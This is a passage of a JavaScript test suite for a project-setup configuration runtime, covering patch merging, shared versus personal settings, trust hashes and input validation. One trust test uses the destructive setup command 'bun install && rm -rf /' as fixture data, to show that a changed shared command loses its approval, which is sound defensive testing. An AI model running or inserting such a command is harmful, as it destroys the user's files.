      expect(view.setupWorktree).toEqual([]);
      expect(view.setupWorktreeWait).toBe(false);
      expect(view.projectActions).toEqual([]);
      expect(view.draftStarters).toEqual([]);
      expect(view.shared.status).toBe('missing');
      expect(view.personal).toEqual(emptyPersonal);
    } finally {
      await cleanup();
    }
  });

  it('round-trips a patch and preserves server-owned and unknown keys', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      await mkdir(path.join(tempRoot, 'projects'), { recursive: true });
      await writeFile(path.join(tempRoot, 'projects', 'project-a.json'), JSON.stringify({
        version: 1,
        scheduledTasks: [{ id: 'task', name: 'Keep me' }],
        futureKey: { from: 'a newer build' },
        'setup-worktree': ['old'],
      }));

      const view = await runtime.updateProjectSetup('project-a', {
        setupWorktree: ['bun install', ''],
        setupWorktreeWait: true,
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }],
        projectActionsPrimaryId: 'dev',
        projectPath: '/repo/a',
      });
      expect(view.setupWorktree).toEqual(['bun install']);
      expect(view.setupWorktreeWait).toBe(true);
      expect(view.projectActions).toEqual([{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null, source: 'personal' }]);
      expect(view.projectActionsPrimaryId).toBe('dev');

      const raw = await readRaw('project-a');
      expect(raw.scheduledTasks).toEqual([{ id: 'task', name: 'Keep me' }]);
      expect(raw.futureKey).toEqual({ from: 'a newer build' });
      expect(raw['setup-worktree']).toEqual(['bun install']);
      expect(raw['setup-worktree-wait']).toBe(true);
      expect(raw.projectPath).toBe('/repo/a');
      expect(await runtime.readProjectSetup('project-a')).toEqual(view);
    } finally {
      await cleanup();
    }
  });

  it('clears the primary action id when the patch sets it to null', async () => {
    const { runtime, readRaw, cleanup } = await createRuntime();
    try {
      await runtime.updateProjectSetup('project-a', {
        projectActions: [{ id: 'dev', name: 'Dev', command: 'x' }],
        projectActionsPrimaryId: 'dev',
      });
      await runtime.updateProjectSetup('project-a', { projectActionsPrimaryId: null });
      expect(await readRaw('project-a')).not.toHaveProperty('projectActionsPrimaryId');
      expect((await runtime.readProjectSetup('project-a')).projectActionsPrimaryId).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('leaves the file alone when the patch is invalid', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      await expect(runtime.updateProjectSetup('project-a', { setupWorktree: 'nope' })).rejects.toThrow('setupWorktree must be');
      await expect(readFile(path.join(tempRoot, 'projects', 'project-a.json'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
    } finally {
      await cleanup();
    }
  });

  it('does not clobber a scheduled task written between read and write', async () => {
    const { runtime, readRaw, cleanup } = await createRuntime();
    try {
      await runtime.upsertScheduledTask('project-a', {
        name: 'Nightly',
        enabled: true,
        schedule: { kind: 'daily', time: '09:30', timezone: 'UTC' },
        execution: { prompt: 'hi', providerID: 'openai', modelID: 'gpt' },
      });
      await Promise.all([
        runtime.updateProjectSetup('project-a', { setupWorktree: ['bun install'] }),
        runtime.updateProjectSetup('project-a', { draftStarters: [{ type: 'skill', name: 's' }] }),
      ]);
      const raw = await readRaw('project-a');
      expect(raw.scheduledTasks).toHaveLength(1);
      expect(raw['setup-worktree']).toEqual(['bun install']);
      expect(raw.draftStarters).toEqual([{ type: 'skill', name: 's' }]);
    } finally {
      await cleanup();
    }
  });

  it('reads the shared file from the checkout the id names and merges it', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({
        version: 1,
        setupWorktree: ['bun install'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }, { id: 'lint', name: 'Lint', command: 'bun lint' }],
        draftStarters: [{ type: 'skill', name: 'triage' }],
        plansDir: 'docs/plans',
      }));
      const projectId = createProjectIdFromPath(repo);

      const fresh = await runtime.readProjectSetup(projectId);
      expect(fresh.shared.status).toBe('ok');
      expect(fresh.shared.plansDir).toBe('docs/plans');
      expect(fresh.setupWorktree).toEqual(['bun install']);
      expect(fresh.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['dev:shared', 'lint:shared']);

      const view = await runtime.updateProjectSetup(projectId, {
        setupWorktree: ['cp .env.example .env'],
        hiddenSharedActionIds: ['lint'],
        projectActions: [{ id: 'mine', name: 'Mine', command: 'x' }],
      });
      expect(view.setupWorktree).toEqual(['bun install', 'cp .env.example .env']);
      expect(view.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['dev:shared', 'mine:personal']);
      expect(view.draftStarters).toEqual([{ type: 'skill', name: 'triage', source: 'shared' }]);
      expect(view.personal.hiddenSharedActionIds).toEqual(['lint']);

      expect(view.trust.trusted).toBe(false);
      const trusted = await runtime.updateProjectSetup(projectId, { sharedTrustHash: view.trust.hash });
      expect(trusted.trust.trusted).toBe(true);
      expect(trusted.personal.sharedTrust?.hash).toBe(view.trust.hash);
      // A pull that changes a shared command invalidates the answer.
      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({ version: 1, setupWorktree: ['bun install && rm -rf /'] }));
      expect((await runtime.readProjectSetup(projectId)).trust.trusted).toBe(false);
      const reset = await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
      expect(reset.personal.sharedTrust).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('writes the shared file without approval and removes it when emptied', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      const projectId = createProjectIdFromPath(repo);
      const sharedPath = path.join(repo, '.openchamber', 'project.json');

      const shared = await runtime.updateSharedProjectSetup(projectId, {
        setupWorktree: ['bun install'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }],
      });
      expect(JSON.parse(await readFile(sharedPath, 'utf8'))).toEqual({
        version: 1,
        setupWorktree: ['bun install'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }],
      });
      expect(shared.shared.status).toBe('ok');
      expect(shared.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['dev:shared']);
      expect(shared.trust.trusted).toBe(false);
      expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
      const approved = await runtime.updateProjectSetup(projectId, { sharedTrustHash: shared.trust.hash });
      expect(approved.trust.trusted).toBe(true);

      // A second patch replaces only the keys it names.
      const withPlans = await runtime.updateSharedProjectSetup(projectId, { plansDir: 'docs/plans' });
      expect(withPlans.shared.plansDir).toBe('docs/plans');
      expect(withPlans.shared.setupWorktree).toEqual(['bun install']);

      const emptied = await runtime.updateSharedProjectSetup(projectId, { setupWorktree: [], projectActions: [], plansDir: null });
      expect(emptied.shared.status).toBe('missing');
      await expect(readFile(sharedPath, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      await expect(readFile(path.join(repo, '.openchamber'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      expect((await readRaw(projectId)).sharedTrust).toBeUndefined();
    } finally {
      await cleanup();
    }
  });

  it('refuses to write the shared file for a checkout that does not exist and on a bad patch', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const projectId = createProjectIdFromPath(path.join(tempRoot, 'missing-repo'));
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: ['x'] })).rejects.toThrow('project checkout not found');
      await expect(runtime.updateSharedProjectSetup('project-test', { setupWorktree: ['x'] })).rejects.toThrow('project checkout not found');
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      await expect(runtime.updateSharedProjectSetup(createProjectIdFromPath(repo), { plansDir: '../x' })).rejects.toThrow('plansDir must be');
      await expect(readFile(path.join(repo, '.openchamber', 'project.json'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
    } finally {
      await cleanup();
    }
  });

  it('hard-disables repository plans even for valid default and configured folders', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      const projectId = createProjectIdFromPath(repo);
      expect(await runtime.resolveSharedPlansDir(projectId)).toBeNull();
      await runtime.updateSharedProjectSetup(projectId, { plansDir: 'docs/plans' });
      expect(await runtime.resolveSharedPlansDir(projectId)).toBeNull();
      expect(await runtime.resolveSharedPlansDir('project-test')).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('resolves no shared folder before reading even malformed personal or repository metadata', async () => {
    const { tempRoot, cleanup } = await createRuntime();
    try {
      let reads = 0;
      const runtime = createProjectConfigRuntime({
        fsPromises: {
          ...(await import('fs/promises')),
          readFile: async () => { reads += 1; throw new Error('metadata must not be read'); },
        },
        path,
        projectsDirPath: path.join(tempRoot, 'projects'),
      });
      expect(await runtime.resolveSharedPlansDir(createProjectIdFromPath(path.join(tempRoot, 'repo')))).toBeNull();
      expect(await runtime.resolveSharedPlansDir('project-test')).toBeNull();
      expect(reads).toBe(0);
    } finally {
      await cleanup();
    }
  });

  it('reports a broken shared file as invalid and still serves the personal setup', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await writeFile(path.join(repo, '.openchamber', 'project.json'), '{ broken');
      const projectId = createProjectIdFromPath(repo);
      await runtime.updateProjectSetup(projectId, { setupWorktree: ['mine'] });

      const view = await runtime.readProjectSetup(projectId);
      expect(view.shared.status).toBe('invalid');
      expect(view.shared.reason).toMatch(/invalid JSON/);
      expect(view.setupWorktree).toEqual(['mine']);
    } finally {
      await cleanup();
    }
  });
});
